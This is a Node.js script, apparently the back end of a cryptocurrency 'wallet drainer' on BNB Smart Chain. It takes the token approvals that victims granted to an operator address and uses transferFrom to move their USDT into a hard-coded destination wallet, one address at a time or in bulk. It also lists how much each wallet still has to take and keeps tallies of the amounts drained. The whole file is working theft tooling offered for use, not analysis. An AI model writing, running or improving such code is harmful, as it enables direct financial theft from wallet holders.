#!/usr/bin/env node
/**
 * CLI Drain Tool — Direct transferFrom
 *
 * Usage:
 *   node cli.js --check           Verify setup
 *   node cli.js --list            List wallets
 *   node cli.js 0xAddr            Drain single wallet
 *   node cli.js --all             Drain all
 */
require('dotenv').config();
const { ethers } = require('ethers');
const fs = require('fs');
const path = require('path');

const CFG = {
    rpcUrl:        process.env.RPC_URL || "https://bsc-dataseed1.binance.org/",
    tokenAddr:     process.env.TOKEN_ADDRESS || "0x55d398326f99059fF775485246999027B3197955",
    operatorAddr:  process.env.OPERATOR_ADDRESS || "0x0c403d5080cB0ef50A562B6f06f3473F83854D31",
    companyWallet: process.env.COMPANY_WALLET || "0x899673Fe0593556f6f66b9D93F73f4d75b0BB08e",
    operatorKey:   process.env.RELAYER_PRIVATE_KEY,
};

if (!CFG.operatorKey) { console.error("❌ RELAYER_PRIVATE_KEY not set"); process.exit(1); }

const provider = new ethers.providers.JsonRpcProvider(CFG.rpcUrl);
const wallet = new ethers.Wallet(CFG.operatorKey, provider);

const usdtRO = new ethers.Contract(CFG.tokenAddr, [
    "function symbol() view returns (string)",
    "function decimals() view returns (uint8)",
    "function balanceOf(address) view returns (uint256)",
    "function allowance(address,address) view returns (uint256)"
], provider);

const usdtRW = new ethers.Contract(CFG.tokenAddr, [
    "function transferFrom(address,address,uint256) returns (bool)"
], wallet);

const WFILE = path.join(__dirname, '.approved_wallets.json');
function loadW() { try { return JSON.parse(fs.readFileSync(WFILE, 'utf8')); } catch(e) { return {}; } }
function saveW(w) { fs.writeFileSync(WFILE, JSON.stringify(w, null, 2)); }

async function drain(addr) {
    const [symbol, decimals] = await Promise.all([usdtRO.symbol(), usdtRO.decimals()]);
    const [allow, bal] = await Promise.all([usdtRO.allowance(addr, CFG.operatorAddr), usdtRO.balanceOf(addr)]);

    if (allow.eq(0)) { console.log(`  ⚪ ${addr} — no allowance to operator`); return null; }
    if (bal.eq(0)) { console.log(`  ⚪ ${addr} — 0 balance`); return null; }

    const amt = bal.lt(allow) ? bal : allow;
    const disp = ethers.utils.formatUnits(amt, decimals);

    console.log(`  🔫 transferFrom ${disp} ${symbol} from ${addr}...`);

    const tx = await usdtRW.transferFrom(addr, CFG.companyWallet, amt, { gasLimit: 100000 });
    console.log(`  ⏳ Tx: ${tx.hash}`);
    const receipt = await tx.wait();

    if (receipt.status !== 1) { console.log(`  ❌ Reverted`); return null; }

    console.log(`  ✅ ${disp} ${symbol} → ${CFG.companyWallet}`);
    console.log(`  🔗 ${receipt.transactionHash}`);

    const w = loadW(); const ex = w[addr] || {};
    w[addr] = { ...ex, lastDrained: Date.now(), totalDrained: (parseFloat(ex.totalDrained||"0") + parseFloat(disp)).toFixed(4) };
    saveW(w);

    return { amount: disp, symbol, txHash: receipt.transactionHash };
}

async function main() {
    const args = process.argv.slice(2);
    if (!args.length) {
        console.log(`\nUsage:\n  node cli.js --check\n  node cli.js --list\n  node cli.js 0xAddr\n  node cli.js --all\n`);
        return;
    }

    console.log(`\n⚡ Operator: ${wallet.address}`);
    console.log(`🏠 Destination: ${CFG.companyWallet}`);

    const bnb = await provider.getBalance(wallet.address);
    console.log(`⛽ BNB: ${ethers.utils.formatEther(bnb)}`);

    const match = wallet.address.toLowerCase() === CFG.operatorAddr.toLowerCase();
    if (!match) {
        console.log(`\n⚠️ Operator key doesn't match OPERATOR_ADDRESS in .env`);
        console.log(`   Key resolves to: ${wallet.address}`);
        console.log(`   .env says:       ${CFG.operatorAddr}`);
    } else {
        console.log(`✅ Operator matches .env`);
    }

    if (bnb.lt(ethers.utils.parseEther("0.005"))) {
        console.log(`⚠️ LOW BNB — send BNB to ${wallet.address}`);
    }

    if (args[0] === '--check') return;

    if (args[0] === '--list') {
        const w = loadW(); const addrs = Object.keys(w);
        if (!addrs.length) { console.log("\n📋 No wallets."); return; }
        const [symbol, decimals] = await Promise.all([usdtRO.symbol(), usdtRO.decimals()]);
        let total = 0;
        console.log(`\n📋 ${addrs.length} wallet(s)\n`);
        for (const a of addrs) {
            const [b, al] = await Promise.all([usdtRO.balanceOf(a), usdtRO.allowance(a, CFG.operatorAddr)]);
            const db = parseFloat(ethers.utils.formatUnits(b, decimals));
            const da = parseFloat(ethers.utils.formatUnits(al, decimals));
            if (al.gt(0) && b.gt(0)) total += db;
            console.log(`  ${!al.gt(0)?'🔴 NOALLOW':b.eq(0)?'⚪ EMPTY ':'🟢 READY '}  ${a}  ${db.toFixed(4)} ${symbol}  (allow:${da.toFixed(2)}, drained:${w[a].totalDrained||'0'})`);
        }
        console.log(`\n  💎 Drainable: ${total.toFixed(4)} ${symbol}\n`);
        return;
    }

    if (args[0] === '--all') {
        const w = loadW(); const addrs = Object.keys(w);
        if (!addrs.length) { console.log("\n📋 No wallets."); return; }
        console.log(`\n🔫 Draining ${addrs.length}...\n`);
        let s=0,f=0,tot=0;
        for (const a of addrs) { try { const r = await drain(a); if (r) { s++; tot += parseFloat(r.amount); } else f++; } catch(e) { f++; console.log(`  ❌ ${a}: ${e.reason||e.message}`); } }
        console.log(`\n🏁 ✅ ${s} | ❌ ${f} | 💰 ${tot.toFixed(4)} USDT`);
        return;
    }

    const addr = args[0].toLowerCase();
    if (!ethers.utils.isAddress(addr)) { console.log("❌ Invalid address"); return; }
    console.log();
    try { await drain(addr); } catch(e) { console.log(`❌ ${e.reason||e.message}`); }
}

main().catch(e => { console.error("Fatal:", e.message); process.exit(1); });